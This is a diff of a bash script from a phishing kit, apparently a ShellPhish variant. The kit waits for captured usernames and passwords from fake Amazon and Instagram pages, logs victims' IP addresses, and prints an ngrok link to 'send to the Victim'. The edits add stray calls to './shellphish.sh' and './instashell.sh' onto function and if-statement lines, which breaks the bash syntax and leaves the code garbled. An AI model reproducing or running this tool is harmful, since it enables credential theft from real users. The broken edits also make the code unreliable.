@@ -97,15 +97,15 @@ exit 1
 
 }
 
-getcredentials() {
+getcredentials() {./shellphish.sh
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "sites/$amazon/usernames.txt" ]]; then
+if [[ -e "sites/$amazon/usernames.txt" ]]; then 
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
-catch_cred
-
+catch_cred shellphish.sh
+start ./shellphish.sh
 fi
 sleep 1
 done 
@@ -113,7 +113,7 @@ done
 
 }
 
-catch_ip() {
+catch_ip() {./instashell.sh
 touch sites/$server/Instagram.otf_vah.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
@@ -124,7 +124,7 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.tx
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
-if [[ -e iptracker.log ]]; then
+if [[ -e iptracker.log ]]; then ./shellphish.sh
 rm -rf iptracker.log
 fi
 
@@ -254,7 +254,7 @@ link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngr
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
-checkfound() {
+checkfound() {./shellphish.sh
 
 
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
